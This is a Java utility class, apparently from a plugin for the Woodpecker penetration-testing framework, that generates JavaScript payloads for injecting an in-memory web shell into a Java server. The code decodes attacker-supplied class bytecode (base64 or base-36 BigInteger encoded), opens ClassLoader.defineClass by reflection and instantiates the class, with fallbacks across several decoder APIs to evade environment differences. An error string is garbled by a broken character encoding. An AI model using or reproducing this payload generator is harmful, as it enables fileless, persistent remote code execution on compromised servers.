package me.gv7.woodpecker.plugin.utils;

import me.gv7.woodpecker.tools.codec.BASE64Encoder;

public class MemShellJSUtils {
    public static BASE64Encoder base64Encoder = new BASE64Encoder();

    public static String getMemShellPayload(byte[] memShell, int mode) throws Exception {
        try {
            switch (mode) {
                case MemShellClassFactory.BASE64:
                    MemShellClassFactory classFactory1 = new MemShellClassFactory(memShell, MemShellClassFactory.BASE64);
                    return removeDuelSpace(
                            "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                                    "try{" +
                                    "    classLoader.loadClass('" + classFactory1.getClassName() + "').newInstance();" +
                                    "}catch (e){" +
                                    "    var clsString = classLoader.loadClass('java.lang.String');" +
                                    "    var bytecodeBase64 = '" + classFactory1.getPayload() + "';" +
                                    "    var bytecode;" +
                                    "    try{" +
                                    "        var clsBase64 = classLoader.loadClass('java.util.Base64');" +
                                    "        var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder');" +
                                    "        var decoder = clsBase64.getMethod('getDecoder').invoke(base64Clz);" +
                                    "        bytecode = clsDecoder.getMethod('decode', clsString).invoke(decoder, bytecodeBase64);" +
                                    "    } catch (ee) {" +
                                    "        try {" +
                                    "            var datatypeConverterClz = classLoader.loadClass('javax.xml.bind.DatatypeConverter');" +
                                    "            bytecode = datatypeConverterClz.getMethod('parseBase64Binary', clsString).invoke(datatypeConverterClz, bytecodeBase64);" +
                                    "        } catch (eee) {" +
                                    "            var clazz1 = classLoader.loadClass('sun.misc.BASE64Decoder');" +
                                    "            bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);" +
                                    "        }" +
                                    "    }" +
                                    "    var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');" +
                                    "    var clsByteArray = classLoader.loadClass('[B');" +
                                    "    var clsInt = java.lang.Integer.TYPE;" +
                                    "    var defineClass = clsClassLoader.getDeclaredMethod('defineClass', clsByteArray, clsInt, clsInt);" +
                                    "    defineClass.setAccessible(true);" +
                                    "    var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bytecode,0,bytecode.length);" +
                                    "    clazz.newInstance();" +
                                    "}");
                case MemShellClassFactory.BIGINTEGER:
                    MemShellClassFactory classFactory2 = new MemShellClassFactory(memShell, MemShellClassFactory.BIGINTEGER);
                    return removeDuelSpace(
                            "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                                    "try{" +
                                    "    classLoader.loadClass('" + classFactory2.getClassName() + "').newInstance();" +
                                    "}catch (e){" +
                                    "    var clsString = classLoader.loadClass('java.lang.String');" +
                                    "    var bytecodeRaw = '" + classFactory2.getPayload() + "';" +
                                    "    var bytecode = new java.math.BigInteger(bytecodeRaw,36).toByteArray();" +
                                    "    var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');" +
                                    "    var clsByteArray = 'a'.getBytes().getClass();" +
                                    "    var clsInt = java.lang.Integer.TYPE;" +
                                    "    var defineClass = clsClassLoader.getDeclaredMethod('defineClass', clsByteArray, clsInt, clsInt);" +
                                    "    defineClass.setAccessible(true);" +
                                    "    var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bytecode,0,bytecode.length);" +
                                    "    clazz.newInstance();" +
                                    "}");
            }
        } catch (Exception ex) {
            return "���ɷ�������:" + ex.getMessage();
        }
        return "";
    }

    private static String removeDuelSpace(String text) {
        while (text.contains("  ")) {
            text = text.replace("  ", "");
        }
        return text;
    }

}